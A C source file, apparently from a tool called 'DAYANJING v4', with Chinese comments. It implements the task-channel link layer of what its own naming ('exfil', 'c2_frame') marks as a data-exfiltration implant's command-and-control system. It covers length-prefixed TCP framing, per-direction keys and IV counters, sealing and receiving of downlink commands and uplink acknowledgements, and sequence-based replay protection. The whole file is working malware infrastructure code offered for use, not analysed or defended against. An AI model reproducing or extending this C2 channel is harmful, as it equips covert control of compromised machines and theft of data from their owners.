/*
 * DAYANJING v4 — task_link.c
 *
 * 任务通道的 IO 绑定实现。见 exfil_task_link.h 的设计说明。
 *
 * 本层不做密码学：AEAD 由 exfil_task_seal/open（底层 02_c2 帧层）完成。
 * 本层负责三件事：
 *   1) 长度前缀帧的可靠读写（TCP 拆包/短写）
 *   2) 两个方向各自的 IV 计数
 *   3) seq 严格递增 —— c2_frame 不提供的重放防护，在此补齐
 */

#include "exfil_task_link.h"
#include "exfil_link.h"

#include <string.h>

/* ---- 长度前缀（u32 LE）---- */

static void put_u32(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)(v         & 0xff);
    p[1] = (uint8_t)((v >> 8)  & 0xff);
    p[2] = (uint8_t)((v >> 16) & 0xff);
    p[3] = (uint8_t)((v >> 24) & 0xff);
}

static uint32_t get_u32(const uint8_t *p)
{
    return (uint32_t)p[0]
         | ((uint32_t)p[1] << 8)
         | ((uint32_t)p[2] << 16)
         | ((uint32_t)p[3] << 24);
}

/* ---- 会话状态 ---- */

int exfil_task_chan_init(exfil_task_chan_t *ch,
                         const uint8_t ks[16], const uint8_t kr[16],
                         const uint8_t pfx[8])
{
    if (!ch || !ks || !kr || !pfx) return EXF_TASK_ERR_ARG;
    if (memcmp(ks, kr, 16) == 0) return EXF_TASK_ERR_ARG;  /* 方向分离不可退化 */

    memset(ch, 0, sizeof *ch);
    memcpy(ch->ks, ks, 16);
    memcpy(ch->kr, kr, 16);
    memcpy(ch->pfx, pfx, 8);
    ch->ctr_down = 0;
    ch->ctr_up = 0;
    ch->has_down = 0;
    ch->has_up = 0;
    return EXF_TASK_OK;
}

void exfil_task_chan_wipe(exfil_task_chan_t *ch)
{
    if (!ch) return;
    memset(ch, 0, sizeof *ch);
}

/* ---- 长度前缀帧 ---- */

int exfil_task_link_send(int fd, const uint8_t *wire, size_t wire_len)
{
    uint8_t hdr[4];

    if (fd < 0 || !wire) return EXF_TASK_ERR_ARG;
    if (wire_len == 0 || wire_len > EXF_TASK_LINK_MAX_WIRE)
        return EXF_TASK_ERR_LEN;

    put_u32(hdr, (uint32_t)wire_len);
    if (exfil_link_write_all(fd, hdr, sizeof hdr) != 0) return EXF_TASK_ERR_IO;
    if (exfil_link_write_all(fd, wire, wire_len) != 0)  return EXF_TASK_ERR_IO;
    return EXF_TASK_OK;
}

int exfil_task_link_recv(int fd, uint8_t *buf, size_t cap, size_t *wire_len)
{
    uint8_t  hdr[4];
    size_t   got;
    uint32_t n;

    if (fd < 0 || !buf || !wire_len) return EXF_TASK_ERR_ARG;
    if (cap < EXF_TASK_LINK_MAX_WIRE) return EXF_TASK_ERR_LEN;

    /* 长度前缀自身也可能被拆包 */
    got = exfil_link_read_exact(fd, hdr, sizeof hdr);
    if (got == 0) return EXF_TASK_ERR_CLOSED;
    if (got < sizeof hdr) return EXF_TASK_ERR_IO;

    n = get_u32(hdr);

    /* 硬上界：绝不按对端声明的长度分配 */
    if (n == 0 || n > EXF_TASK_LINK_MAX_WIRE) return EXF_TASK_ERR_LEN;

    got = exfil_link_read_exact(fd, buf, n);
    if (got == 0) return EXF_TASK_ERR_CLOSED;
    if (got < n) return EXF_TASK_ERR_IO;

    *wire_len = n;
    return EXF_TASK_OK;
}

/* ---- 下行：命令 ---- */

int exfil_task_chan_cmd(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_cmd_t *c)
{
    uint8_t wire[EXF_TASK_LINK_MAX_WIRE];
    size_t  wlen = 0;
    int     r;

    if (!ch || !c) return EXF_TASK_ERR_ARG;

    r = exfil_task_seal_cmd(ch->ks, ch->pfx, ch->ctr_down, seq, c,
                            wire, sizeof wire, &wlen);
    if (r != EXF_TASK_OK) return r;

    r = exfil_task_link_send(fd, wire, wlen);
    if (r != EXF_TASK_OK) return r;

    ch->ctr_down++;
    return EXF_TASK_OK;
}

int exfil_task_chan_recv_cmd(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_cmd_t *c)
{
    uint8_t wire[EXF_TASK_LINK_MAX_WIRE];
    size_t  wlen = 0;
    uint64_t s = 0;
    int     r;

    if (!ch || !c) return EXF_TASK_ERR_ARG;

    r = exfil_task_link_recv(fd, wire, sizeof wire, &wlen);
    if (r != EXF_TASK_OK) return r;

    /* 用 kr 解下行：对端用 ks 封，ks 是"下行方向密钥"，
     * 在两端分别表现为 ks/kr 的互补关系（见 exfil_chan 的方向约定）*/
    r = exfil_task_open_cmd(ch->kr, wire, wlen, &s, c);
    if (r != EXF_TASK_OK) return r;

    /* 重放防护：c2_frame 不跟踪计数器，必须在此补上 */
    if (ch->has_down && s <= ch->last_seq_down) return EXF_TASK_ERR_REPLAY;

    ch->last_seq_down = s;
    ch->has_down = 1;
    if (seq) *seq = s;
    return EXF_TASK_OK;
}

/* ---- 上行：回执 ---- */

int exfil_task_chan_ack(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_ack_t *a)
{
    uint8_t wire[EXF_TASK_LINK_MAX_WIRE];
    size_t  wlen = 0;
    int     r;

    if (!ch || !a) return EXF_TASK_ERR_ARG;

    r = exfil_task_seal_ack(ch->kr, ch->pfx, ch->ctr_up, seq, a,
                            wire, sizeof wire, &wlen);
    if (r != EXF_TASK_OK) return r;

    r = exfil_task_link_send(fd, wire, wlen);
    if (r != EXF_TASK_OK) return r;

    ch->ctr_up++;
    return EXF_TASK_OK;
}

int exfil_task_chan_recv_ack(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_ack_t *a)
{
    uint8_t  wire[EXF_TASK_LINK_MAX_WIRE];
    size_t   wlen = 0;
    uint64_t s = 0;
    int      r;

    if (!ch || !a) return EXF_TASK_ERR_ARG;

    r = exfil_task_link_recv(fd, wire, sizeof wire, &wlen);
    if (r != EXF_TASK_OK) return r;

    /* 用 ks 解上行 */
    r = exfil_task_open_ack(ch->ks, wire, wlen, &s, a);
    if (r != EXF_TASK_OK) return r;

    if (ch->has_up && s <= ch->last_seq_up) return EXF_TASK_ERR_REPLAY;

    ch->last_seq_up = s;
    ch->has_up = 1;
    if (seq) *seq = s;
    return EXF_TASK_OK;
}
